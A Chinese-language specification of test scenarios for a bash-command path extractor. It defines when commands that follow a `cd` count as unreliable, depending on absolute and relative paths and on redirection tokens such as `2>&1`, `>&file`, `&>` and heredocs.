#### Scenario: cd 后绝对路径命令含 fd 复制重定向 token 豁免（本 change 新增）

- **WHEN** bash 命令为 `cd /tmp/x && cat /tmp/x/file.txt 2>&1 | head`
- **THEN** 不判 `cd_chdir`（`2>&1` 是 fd 复制，非文件引用；`/tmp/x/file.txt` 绝对；cd 跟踪豁免逐 stage 检查通过），提取结果 `reliable: true`

#### Scenario: cd 后绝对路径命令含绝对写重定向豁免（本 change 新增）

- **WHEN** bash 命令为 `cd /tmp/x && ls /tmp/x 2>>/tmp/err.log`
- **THEN** 不判 `cd_chdir`（`2>>` 目标 `/tmp/err.log` 绝对，重定向扫描提取；`/tmp/x` 位置参数绝对——全绝对下游豁免成立），提取结果 `reliable: true`，targets 含 `/tmp/x`（读）与 `/tmp/err.log`（写）

#### Scenario: cd 后相对路径引用伴重定向 token 仍判不可靠（本 change 新增）

- **WHEN** bash 命令为 `cd /tmp/x && ls sub 2>/dev/null`
- **THEN** 判 `cd_chdir`（`sub` 是真实相对位置参数，非重定向 token，仍收集；`looksLikePath("sub")` 为 false → D2a 条件 9 / D2b 排除，豁免不成立）

#### Scenario: cd 后相对重定向写目标伴重定向 token 仍判不可靠（本 change 新增）

- **WHEN** bash 命令为 `cd /tmp/x && ls /tmp/x > out.txt 2>/dev/null`
- **THEN** 判 `cd_chdir`（重定向扫描提取 `out.txt` 相对写目标 → `hasCwdRelativePathRef` 命中 → D2b 排除；D2a 条件 9 `looksLikePath("out.txt")` 为 true 不触发但条件 4 `containsCwdAnchor` 不命中、D2b 排除成立；`2>/dev/null` 重定向 token 跳过不影响 `out.txt` 相对性判定）

#### Scenario: cd 后混合位置参数与重定向 token 仍判不可靠（本 change 新增）

- **WHEN** bash 命令为 `cd /tmp/x && ls foo>bar`
- **THEN** 判 `cd_chdir`（`foo>bar` 不以操作符开头，不命中重定向 token 判据，仍收集；`looksLikePath("foo>bar")` 为 false → D2a 条件 9 / D2b 排除）

#### Scenario: cd 后 &> 重定向仍判不可靠（已知边界，本 change 新增）

- **WHEN** bash 命令为 `cd /tmp/x && ls /tmp/x &>log`
- **THEN** 判 `cd_chdir`（`&>log` 不以标准操作符开头，不命中重定向 token 判据，仍收集；`looksLikePath("&>log")` 为 false → 保守排除；重定向扫描不覆盖 `&>` 写目标，待后续独立 change 处理——本 scenario 固定现状保守行为）

#### Scenario: cd 后文件词 fd 复制重定向仍判不可靠（本 change 新增，架构 review critical 修复）

- **WHEN** bash 命令为 `cd /tmp/x && ls /tmp/x >&rel.txt`
- **THEN** 判 `cd_chdir`（`>&rel.txt` 是文件词 fd 复制，等价 `>rel.txt 2>&1`；扫描对 `>&` 一律 `continue` 不提取其文件目标——若跳过会丢失写目标 `rel.txt` → cd 豁免静默放行写 `/tmp/x/rel.txt`，安全洞。故不命中重定向 token 判据，保持收集；`rel.txt` 由 `looksLikePath` 判定为可提取相对路径但 `>&rel.txt` 整 token 被收集为相对 ref → D2b `hasCwdRelativePathRef` 命中 → 保守 `cd_chdir`，与现状一致）

#### Scenario: cd 后数字 fd 文件词重定向仍判不可靠（本 change 新增，架构 review critical 修复）

- **WHEN** bash 命令为 `cd /tmp/x && ls /tmp/x 2>&rel.txt`
- **THEN** 判 `cd_chdir`（`2>&rel.txt` 是文件词 fd 复制，等价 `>rel.txt 2>&1`；扫描对 `2>&` 分支 `continue` 不提取其文件目标——跳过会丢失写目标 → cd 豁免静默放行。故不命中重定向 token 判据，保持收集；`looksLikePath("2>&rel.txt")` 为 true（`.txt` 后缀）但被收集为相对 ref → D2b 排除 → 保守 `cd_chdir`，与现状一致）

#### Scenario: cd 后无路径引用纯 heredoc 仍判不可靠（本 change 新增）

- **WHEN** bash 命令为 `cd /etc && cat <<EOF`
- **THEN** 判不可靠（`<<EOF` 是 heredoc 重定向 token，不命中判据保持收集；无任何绝对路径引用 → D2b 条件 1 `anyAbsRef` 为 false → 豁免不适用。实测：实际 reason 为 `heredoc`——由 scanUnreliable 在 cd 守卫之前拦截，与 `cd_chdir` 同为「判不可靠」拦截，安全语义一致；属守卫链顺序实现细节，两 reason 均可接受）
